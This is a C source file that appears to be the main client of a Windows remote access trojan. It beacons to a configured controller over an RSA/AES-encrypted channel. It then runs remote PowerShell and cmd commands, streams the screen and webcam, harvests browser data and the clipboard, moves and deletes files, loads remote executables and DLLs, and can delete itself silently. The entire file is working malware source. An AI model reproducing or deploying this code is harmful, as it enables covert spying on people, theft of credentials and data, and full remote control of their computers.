#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <process.h>
#include "utils.h"
#include "cJSON.h"
#include "sysinfo.h"
#include "shell.h"
#include "tasks.h"
#include "clipboard.h"
#include "filebrowser.h"
#include "rfe.h"
#include "screen.h"
#include "camera.h"
#include "browser.h"

#pragma comment(lib, "ws2_32.lib")

int g_reconnect_delay = 5000;

SessionKey g_session;
SOCKET g_sock = INVALID_SOCKET;
HANDLE g_send_mutex = NULL;
HANDLE g_screen_stop = NULL;
HANDLE g_camera_stop = NULL;

typedef struct {
    char cmd[1024];
} CommandArgs;

void handle_command(void* arg) {
    CommandArgs* ca = (CommandArgs*)arg;
    char* cmd = ca->cmd;

    if (strcmp(cmd, g_conf.s_ping) == 0) {
        sock_send_ex(g_sock, g_send_mutex, g_conf.s_pong, "");
    } else if (strncmp(cmd, g_conf.s_msg, strlen(g_conf.s_msg)) == 0) {
        MessageBoxA(NULL, cmd + strlen(g_conf.s_msg), "Message", MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
        sock_send(g_sock, g_send_mutex, "ok");
    } else if (strncmp(cmd, g_conf.s_exec_ps, strlen(g_conf.s_exec_ps)) == 0) {
        char* out = run_powershell(cmd + strlen(g_conf.s_exec_ps));
        char* saveptr;
        char* line = strtok_r(out, "\n", &saveptr);
        while (line) {
            char buf[4096];
            _snprintf(buf, sizeof(buf), "%s%s", g_conf.s_ps_out, line);
            sock_send(g_sock, g_send_mutex, buf);
            line = strtok_r(NULL, "\n", &saveptr);
        }
        free(out);
    } else if (strncmp(cmd, g_conf.s_exec_cmd, strlen(g_conf.s_exec_cmd)) == 0) {
        char* out = run_cmd(cmd + strlen(g_conf.s_exec_cmd));
        char* saveptr;
        char* line = strtok_r(out, "\n", &saveptr);
        while (line) {
            char buf[4096];
            _snprintf(buf, sizeof(buf), "%s%s", g_conf.s_cmd_out, line);
            sock_send(g_sock, g_send_mutex, buf);
            line = strtok_r(NULL, "\n", &saveptr);
        }
        free(out);
    } else if (strcmp(cmd, g_conf.s_scr_stop) == 0) {
        if (g_screen_stop) SetEvent(g_screen_stop);
    } else if (strcmp(cmd, g_conf.s_cam_stop) == 0) {
        if (g_camera_stop) SetEvent(g_camera_stop);
    } else if (strcmp(cmd, g_conf.s_tasklist) == 0) {
        handle_tasklist(g_sock, g_send_mutex);
    } else if (strncmp(cmd, g_conf.s_taskkill, strlen(g_conf.s_taskkill)) == 0) {
        handle_taskkill(g_sock, g_send_mutex, cmd + strlen(g_conf.s_taskkill));
    } else if (strncmp(cmd, g_conf.s_ls, strlen(g_conf.s_ls)) == 0) {
        handle_ls(g_sock, g_send_mutex, cmd + strlen(g_conf.s_ls));
    } else if (strncmp(cmd, g_conf.s_download, strlen(g_conf.s_download)) == 0) {
        handle_download(g_sock, g_send_mutex, cmd + strlen(g_conf.s_download));
    } else if (strncmp(cmd, g_conf.s_delete, strlen(g_conf.s_delete)) == 0) {
        handle_delete(g_sock, g_send_mutex, cmd + strlen(g_conf.s_delete));
    } else if (strncmp(cmd, g_conf.s_mkdir, strlen(g_conf.s_mkdir)) == 0) {
        handle_mkdir(g_sock, g_send_mutex, cmd + strlen(g_conf.s_mkdir));
    } else if (strncmp(cmd, g_conf.s_upload, strlen(g_conf.s_upload)) == 0) {
        handle_upload(g_sock, g_send_mutex, cmd + strlen(g_conf.s_upload));
    } else if (strncmp(cmd, g_conf.s_rename, strlen(g_conf.s_rename)) == 0) {
        handle_rename(g_sock, g_send_mutex, cmd + strlen(g_conf.s_rename));
    } else if (strncmp(cmd, g_conf.s_rfe_exe, strlen(g_conf.s_rfe_exe)) == 0) {
        handle_rfe_exe(g_sock, g_send_mutex, cmd + strlen(g_conf.s_rfe_exe));
    } else if (strncmp(cmd, g_conf.s_rfe_dll, strlen(g_conf.s_rfe_dll)) == 0) {
        handle_rfe_dll(g_sock, g_send_mutex, cmd + strlen(g_conf.s_rfe_dll));
    } else if (strncmp(cmd, g_conf.s_browser, strlen(g_conf.s_browser)) == 0) {
        collect_browser_data(cmd + strlen(g_conf.s_browser), g_sock, g_send_mutex);
    } else if (strcmp(cmd, g_conf.s_clip_get) == 0) {
        handle_clipboard_get(g_sock, g_send_mutex);
    } else if (strncmp(cmd, g_conf.s_clip_set, strlen(g_conf.s_clip_set)) == 0) {
        handle_clipboard_set(g_sock, g_send_mutex, cmd + strlen(g_conf.s_clip_set));
    } else if (strcmp(cmd, g_conf.s_uninstall) == 0) {
        char self_path[MAX_PATH] = {0};
        GetModuleFileNameA(NULL, self_path, MAX_PATH);
        char cmd_line[MAX_PATH + 64];
        _snprintf(cmd_line, sizeof(cmd_line),
            "cmd /c ping -n 2 127.0.0.1 > nul && del /f /q \"%s\"", self_path);
        STARTUPINFOA si = {0}; si.cb = sizeof(si);
        PROCESS_INFORMATION pi = {0};
        CreateProcessA(NULL, cmd_line, NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        closesocket(g_sock);
        ExitProcess(0);
    } else if (strcmp(cmd, g_conf.s_close) == 0) {
        closesocket(g_sock);
        ExitProcess(0);
    } else if (strcmp(cmd, g_conf.s_reconnect) == 0) {
        closesocket(g_sock);
        g_sock = INVALID_SOCKET;
    } else if (strncmp(cmd, g_conf.s_set_delay, strlen(g_conf.s_set_delay)) == 0) {
        int delay = atoi(cmd + strlen(g_conf.s_set_delay));
        if (delay > 0) g_reconnect_delay = delay;
    }

    free(ca);
}

typedef struct {
    int fps;
} StreamArgs;

void screen_thread(void* arg) {
    StreamArgs* sa = (StreamArgs*)arg;
    screen_stream_loop(g_sock, g_send_mutex, g_screen_stop, sa->fps);
    free(sa);
}

void camera_thread(void* arg) {
    StreamArgs* sa = (StreamArgs*)arg;
    camera_stream_loop(g_sock, g_send_mutex, g_camera_stop, sa->fps);
    free(sa);
}

int main() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    load_config_from_resource();

    g_send_mutex = CreateMutex(NULL, FALSE, NULL);
    char* info = collect_sysinfo();

    while (1) {
        g_sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_addr.s_addr = (g_conf.host[0] != 0) ? inet_addr(g_conf.host) : INADDR_NONE;
        server.sin_port = htons(g_conf.port);

        if (server.sin_addr.s_addr == INADDR_NONE || g_conf.port == 0) {
            closesocket(g_sock);
            Sleep(g_reconnect_delay);
            continue;
        }

        if (connect(g_sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
            closesocket(g_sock);
            Sleep(g_reconnect_delay);
            continue;
        }

        HCRYPTPROV hProv;
        CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
        CryptGenRandom(hProv, 32, g_session.key);
        CryptGenRandom(hProv, 16, g_session.iv);
        CryptReleaseContext(hProv, 0);

        unsigned char session_data[48];
        memcpy(session_data, g_session.key, 32);
        memcpy(session_data + 32, g_session.iv, 16);

        char* encrypted_hs = rsa_encrypt_pkcs1(session_data, 48, RSA_PUB_KEY);
        if (encrypted_hs) {
            cJSON* hs_root = cJSON_CreateObject();
            cJSON_AddStringToObject(hs_root, g_conf.s_session, encrypted_hs);
            char* hs_json = cJSON_PrintUnformatted(hs_root);
            char hs_buf[2048];
            _snprintf(hs_buf, sizeof(hs_buf), "%s\n", hs_json);
            send(g_sock, hs_buf, (int)strlen(hs_buf), 0);
            free(hs_json);
            cJSON_Delete(hs_root);
            free(encrypted_hs);
        }

        char sysinfo_msg[4096];
        _snprintf(sysinfo_msg, sizeof(sysinfo_msg), "%s%s", g_conf.s_sysinfo, info);
        sock_send(g_sock, g_send_mutex, sysinfo_msg);

        char buf[8192];
        int n;
        while ((n = recv(g_sock, buf, sizeof(buf) - 1, 0)) > 0) {
            buf[n] = 0;
            char* saveptr;
            char* line = strtok_r(buf, "\n", &saveptr);
            while (line) {
                cJSON* packet = cJSON_Parse(line);
                if (packet) {
                    cJSON* data = cJSON_GetObjectItem(packet, "data");
                    cJSON* iv_b64 = cJSON_GetObjectItem(packet, "iv");
                    if (data && iv_b64) {
                        size_t iv_len;
                        unsigned char* iv = base64_decode(iv_b64->valuestring, strlen(iv_b64->valuestring), &iv_len);
                        size_t plain_len;
                        unsigned char* decrypted = aes_256_cbc_decrypt(data->valuestring, &plain_len, g_session.key, iv);
                        if (decrypted) {
                            decrypted[plain_len] = 0;
                            cJSON* msg = cJSON_Parse((char*)decrypted);
                            if (msg) {
                                cJSON* type = cJSON_GetObjectItem(msg, "type");
                                cJSON* payload = cJSON_GetObjectItem(msg, "payload");
                                if (type && strcmp(type->valuestring, g_conf.s_ping) == 0) {
                                    sock_send_ex(g_sock, g_send_mutex, g_conf.s_pong, "");
                                } else if (type && strcmp(type->valuestring, g_conf.s_command) == 0 && payload) {
                                    char* cmd_val = payload->valuestring;

                                    if (strncmp(cmd_val, g_conf.s_scr_start, strlen(g_conf.s_scr_start)) == 0) {
                                        int fps = atoi(cmd_val + strlen(g_conf.s_scr_start));
                                        if (g_screen_stop) {
                                            SetEvent(g_screen_stop);
                                            Sleep(100);
                                            CloseHandle(g_screen_stop);
                                        }
                                        g_screen_stop = CreateEvent(NULL, TRUE, FALSE, NULL);
                                        StreamArgs* sa = malloc(sizeof(StreamArgs));
                                        sa->fps = fps;
                                        _beginthread(screen_thread, 0, sa);
                                    } else if (strncmp(cmd_val, g_conf.s_cam_start, strlen(g_conf.s_cam_start)) == 0) {
                                        int fps = atoi(cmd_val + strlen(g_conf.s_cam_start));
                                        if (g_camera_stop) {
                                            SetEvent(g_camera_stop);
                                            Sleep(100);
                                            CloseHandle(g_camera_stop);
                                        }
                                        g_camera_stop = CreateEvent(NULL, TRUE, FALSE, NULL);
                                        StreamArgs* sa = malloc(sizeof(StreamArgs));
                                        sa->fps = fps;
                                        _beginthread(camera_thread, 0, sa);
                                    } else {
                                        CommandArgs* ca = malloc(sizeof(CommandArgs));
                                        strncpy(ca->cmd, cmd_val, sizeof(ca->cmd) - 1);
                                        ca->cmd[sizeof(ca->cmd) - 1] = 0;
                                        _beginthread(handle_command, 0, ca);
                                    }
                                }
                                cJSON_Delete(msg);
                            }
                            free(decrypted);
                        }
                        free(iv);
                    }
                    cJSON_Delete(packet);
                }
                line = strtok_r(NULL, "\n", &saveptr);
            }
        }

        closesocket(g_sock);
        if (g_screen_stop) SetEvent(g_screen_stop);
        if (g_camera_stop) SetEvent(g_camera_stop);
        Sleep(g_reconnect_delay);
    }

    free(info);
    return 0;
}
